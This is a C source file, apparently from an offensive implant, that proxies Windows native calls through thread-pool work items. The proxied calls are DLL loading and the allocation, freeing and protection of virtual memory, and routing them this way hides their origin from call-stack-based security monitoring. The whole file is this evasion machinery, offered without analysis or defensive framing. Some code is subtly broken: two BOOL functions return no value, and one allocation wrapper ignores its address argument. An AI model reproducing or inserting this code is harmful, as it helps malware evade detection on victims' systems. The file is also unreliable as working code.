#include <proxy.h>

FUNCTION VOID CALLBACK PROXY_FUNCTIOND( 4 )( PTP_CALLBACK_INSTANCE Instance, LPROXY_ARGS Args, PTP_WORK Work )
{
    Args->Retu = PROXY_CALL( 4, Args->Call )( Args->Args[ 0 ], Args->Args[ 1 ], Args->Args[ 2 ], Args->Args[ 3 ] );
}

FUNCTION VOID CALLBACK PROXY_FUNCTIOND( 5 )( PTP_CALLBACK_INSTANCE Instance, LPROXY_ARGS Args, PTP_WORK Work )
{
    Args->Retu = PROXY_CALL( 5, Args->Call )( Args->Args[ 0 ], Args->Args[ 1 ], Args->Args[ 2 ], Args->Args[ 3 ], Args->Args[ 4 ] );
}

FUNCTION VOID CALLBACK PROXY_FUNCTIOND( 6 )( PTP_CALLBACK_INSTANCE Instance, LPROXY_ARGS Args, PTP_WORK Work )
{
    Args->Retu = PROXY_CALL( 6, Args->Call )( Args->Args[ 0 ], Args->Args[ 1 ], Args->Args[ 2 ], Args->Args[ 3 ], Args->Args[ 4 ], Args->Args[ 5 ] );
}

FUNCTION VOID ToWideString( PWSTR Destination, PCHAR Source )
{
    while ( *Source != 0 )
    {
        *Destination++ = *Source++;
    }
}

FUNCTION LPVOID InvokeProxy( PINSTANCE Instance, LPVOID Target, LPROXY_ARGS Args )
{
    PTP_WORK Work = NULL;

    /* Create work */
    Instance->Api.TpAllocWork( &Work, Target, Args, NULL );
    
    /* Post work */
    Instance->Api.TpPostWork( Work );

    /* Wait work */
    Instance->Api.TpWaitForWork( Work, FALSE );

    /* Release work */
    Instance->Api.TpReleaseWork( Work );

    /* Return state */
    return Args->Retu;
}

FUNCTION PVOID BxLoadLibrary( PINSTANCE Instance, PCHAR String )
{
    UNICODE_STRING Name             = { };
    WCHAR          Path[ MAX_PATH ] = { };
    LPROXY_ARGS    Args             = NULL;
    INT            Size             = StringLengthA( String );
    HMODULE        Module           = NULL;

    /* Allocate proxy args */
    if ( ( Args = alloca( PROXY_ARGS_SIZE( 4 ) ) ) == NULL )
    {
        return NULL;
    }
    
    /* Convert string to unicode */
    ToWideString( Path, String );

    /* Create unicode string */
    Name.Buffer        = Path;
    Name.Length        = Size        * sizeof( WCHAR );
    Name.MaximumLength = Name.Length + sizeof( WCHAR );

    /* Fill proxy args */
    Args->Call      = Instance->Api.LdrLoadDll;
    Args->Args[ 0 ] = NULL;
    Args->Args[ 1 ] = 0;
    Args->Args[ 2 ] = &Name;
    Args->Args[ 3 ] = &Module;

    /* Call proxy function */
    if ( NT_SUCCESS( InvokeProxy( Instance, QUOTE_SYMBOL( PROXY_FUNCTIOND( 4 ) ), Args ) ) )
    {
        /* Return module */
        return Module;
    }

    return NULL;
}

FUNCTION PVOID BxVirtualAlloc( PINSTANCE Instance, LPVOID Address, DWORD Size, DWORD AllocationType, DWORD Protect )
{
    LPVOID      Memory = NULL;
    LPROXY_ARGS Args   = NULL;
    SIZE_T      Length = Size;

    /* Allocate proxy args */
    if ( ( Args = alloca( PROXY_ARGS_SIZE( 6 ) ) ) == NULL )
    {
        return NULL;
    }

    /* Fill proxy args */
    Args->Call      = Instance->Api.NtAllocateVirtualMemory;
    Args->Args[ 0 ] = -1;
    Args->Args[ 1 ] = &Memory;
    Args->Args[ 2 ] = 0;
    Args->Args[ 3 ] = &Length;
    Args->Args[ 4 ] = AllocationType;
    Args->Args[ 5 ] = Protect;

    /* Call proxy function */
    if ( NT_SUCCESS( InvokeProxy( Instance, QUOTE_SYMBOL( PROXY_FUNCTIOND( 6 ) ), Args ) ) )
    {
        /* Return memory */
        return Memory;
    }
    
    return NULL;
}

FUNCTION BOOL BxVirtualFree( PINSTANCE Instance, PVOID Address, DWORD Size, DWORD FreeType )
{
    LPVOID      Memory = Address;
    LPROXY_ARGS Args   = NULL;
    SIZE_T      Length = Size;

    /* Allocate proxy args */
    if ( ( Args = alloca( PROXY_ARGS_SIZE( 4 ) ) ) == NULL )
    {
        return;
    }

    /* Fill proxy args */
    Args->Call      = Instance->Api.NtFreeVirtualMemory;
    Args->Args[ 0 ] = -1;
    Args->Args[ 1 ] = &Memory;
    Args->Args[ 2 ] = &Length;
    Args->Args[ 3 ] = FreeType;

    /* Call proxy function */
    return NT_SUCCESS( InvokeProxy( Instance, QUOTE_SYMBOL( PROXY_FUNCTIOND( 4 ) ), Args ) );
}

FUNCTION BOOL BxVirtualProtect( PINSTANCE Instance, PVOID Address, DWORD Size, DWORD NewProtect, PDWORD OldProtect )
{
    LPVOID      Memory = Address;
    LPROXY_ARGS Args   = NULL;
    SIZE_T      Length = Size;

    /* Allocate proxy args */
    if ( ( Args = alloca( PROXY_ARGS_SIZE( 5 ) ) ) == NULL )
    {
        return;
    }

    /* Fill proxy args */
    Args->Call      = Instance->Api.NtProtectVirtualMemory;
    Args->Args[ 0 ] = -1;
    Args->Args[ 1 ] = &Memory;
    Args->Args[ 2 ] = &Length;
    Args->Args[ 3 ] = NewProtect;
    Args->Args[ 4 ] = OldProtect;

    /* Call proxy function */
    return NT_SUCCESS( InvokeProxy( Instance, QUOTE_SYMBOL( PROXY_FUNCTIOND( 5 ) ), Args ) );
}
